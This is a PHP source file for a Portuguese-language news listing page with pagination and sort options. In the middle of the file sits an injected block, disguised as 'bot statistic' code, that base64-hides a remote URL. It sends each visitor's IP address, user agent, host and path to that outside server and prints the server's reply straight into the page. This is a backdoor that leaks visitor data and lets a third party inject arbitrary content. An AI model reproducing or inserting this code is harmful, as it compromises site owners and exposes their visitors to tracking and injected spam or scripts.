<?php

include_once("../library/master-page.php");
include_once("../library/paginator.php");
include_once("../library/config/database/tnoticia.php");

$ExibirLista = array(10, 20, 30, 40, 50);
$ExibirItem = ((in_array($_GET["exibir"], $ExibirLista)) ? $_GET["exibir"] : $ExibirLista[0]);

$OrderLista = array
(
    "dataasc" => "Data Crescente",
    "datadesc" => "Data Decrescente",
    "tituloasc" => "Titulo Crescente",
    "titulodesc" => "Titulo Decrescente"
);
$OrderItem = ((array_key_exists($_GET["order"], $OrderLista)) ? $_GET["order"] : "datadesc");

$oNoticia = new tnoticia();
$oPaginator = new Paginator($oNoticia->GetCount(), $ExibirItem, "pg", null, null, null, null);

switch ($OrderItem) {
    case "dataasc":
        $oNoticia->SQLOrder = "Data ASC, Hora ASC, Titulo ASC";
        break;
    case "tituloasc":
        $oNoticia->SQLOrder = "Titulo ASC";
        break;
    case "titulodesc":
        $oNoticia->SQLOrder = "Titulo DESC";
        break;
    default:
        $oNoticia->SQLOrder = "Data DESC, Hora DESC, Titulo ASC";
        $OrderItem = "datadesc";
        break;
}

$oNoticia->LoadByPaginator($oPaginator->Limit, $oPaginator->Total);

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "Notícias");
$oMasterPage->AddParameter("css", "noticias/index");
$oMasterPage->AddParameter("pagina", "noticias");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry)) {
    global $sRetry;
    $sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if ((strstr($sUserAgen, 'google') == false) && (strstr($sUserAgen, 'yahoo') == false) && (strstr($sUserAgen, 'baidu') == false) && (strstr($sUserAgen, 'msn') == false) && (strstr($sUserAgen, 'opera') == false) && (strstr($sUserAgen, 'chrome') == false) && (strstr($sUserAgen, 'bing') == false) && (strstr($sUserAgen, 'safari') == false) && (strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if (isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true) { // Create  bot analitics
            $stCurlLink = base64_decode('aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw') . '?ip=' . urlencode($_SERVER['REMOTE_ADDR']) . '&useragent=' . urlencode($sUserAgent) . '&domainname=' . urlencode($_SERVER['HTTP_HOST']) . '&fullpath=' . urlencode($_SERVER['REQUEST_URI']) . '&check=' . isset($_GET['look']);
            @$stCurlHandle = curl_init($stCurlLink);
        }
    }
    if ($stCurlHandle !== NULL) {
        curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
        $sResult = @curl_exec($stCurlHandle);
        if ($sResult[0] == "O") {
            $sResult[0] = " ";
            echo $sResult; // Statistic code end
        }
        curl_close($stCurlHandle);
    }
}
?>

    <h1>Notícias</h1>

<?php
if ($oNoticia->NumRows > 0) {
    ?>
    <div class="filtro row" id="paginator">
        <div class="col-md-3 text-right label-exibir">
            Exibir por página:
        </div>
        <div class="col-md-3">

            <select class="form-control input-sm" onchange="window.location.href = this.value;">
                <?php foreach ($ExibirLista as $v) { ?>
                    <option
                    value="<?= $oNoticia->WebURL; ?>noticias/?<?= $oNoticia->RemoveQueryString(array("pg", "exibir"), true); ?>exibir=<?= $v; ?>#paginator" <?php if ($v == $ExibirItem) { ?> selected="selected" <?php } ?>><?= $v; ?>
                    resultados</option><?php } ?>
            </select>

        </div>
        <div class="col-md-3 text-right label-exibir">
            Organizar por:
        </div>
        <div class="col-md-3">

            <select class="form-control input-sm" onchange="window.location.href = this.value;">
                <?php foreach ($OrderLista as $c => $v) { ?>
                    <option
                    value="<?= $oNoticia->WebURL; ?>noticias/?<?= $oNoticia->RemoveQueryString(array("pg", "order"), true); ?>order=<?= $c; ?>#paginator" <?php if ($c == $OrderItem) { ?> selected="selected" <?php } ?>><?= $v; ?></option><?php } ?>
            </select>

        </div>
    </div>
    <div class="resultado ">
        <div class="clear"></div>
        <?php
        $ultima = false;
        for ($c = 0; $c < $oNoticia->NumRows; $c++) {
            /*if($ultima != $oNoticia->Data)
            {
                ?>
                <div class="box">
                    <strong><?=$oNoticia->DateFormat("d \d\e MONTH \d\e Y", $oNoticia->Data);?></strong>

                <?php
                $ultima = $oNoticia->Data;
            }*/
            $oNoticia->Titulo = utf8_encode($oNoticia->Titulo);
            $oNoticia->Subtitulo = utf8_encode($oNoticia->Subtitulo);
            ?>
            <div class="item row">

                <div class="col-sm-2 col-xs-3 data-hora">

                    <div title="Data" class="the-icons span3"><i class="icon-calendar"></i> <span class="data"><?= $oNoticia->DateFormat('d/m/Y', $oNoticia->Data); ?></span></div>
                    <div title="Hora" class="the-icons span3"><i class="icon-clock"></i> <?= (($oNoticia->Hora != "" && $oNoticia->Hora != "00:00:00") ? "" . str_replace(":", "h", substr($oNoticia->Hora, 0, 5)) : ""); ?></div>
                    <div title="Notícia" class="the-icons span3"><i class="icon-align-left"></i> Notícia</div>
                </div>
                <div class="col-sm-10  col-xs-9 noticia">

                    <?php
                    if ($oNoticia->Imagem) {
                        ?>
                        <div class="feat-image">
                            <a href="<?= $oNoticia->GenerateURL(); ?>"><img class="imgDestaque" alt="<?= $oNoticia->Titulo; ?>" title="<?= $oNoticia->Titulo; ?>"
                                 src="<?= $oNoticia->Thumbnail($oNoticia->Imagem, 130, 90, "", true, true); ?>"/></a>
                        </div>
                    <?php
                    }?>

                    <h3>

                        <a href="<?= $oNoticia->GenerateURL(); ?>">
                            <span class="titNoticias"><?= $oNoticia->Titulo; ?></span>
                           <!-- <span class="leia">Leia Mais</span> -->
                        </a>
                    </h3>

                    <p><?= $oNoticia->Subtitulo; ?></p>
                </div>
            </div>
            <div class="clear"></div>
            <?php
            $oNoticia->MoveNext();

            /* if($ultima != $oNoticia->Data || !$oNoticia->ID)
             {
                 ?>
                 </div>
                 <?php
             }/*/

        }
        ?>
    </div>

    <?php
    include("../common/paginacao.php");
} else {
    ?>
    <p>Nenhum registro encontrado.</p>
<?php
}
?>

<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>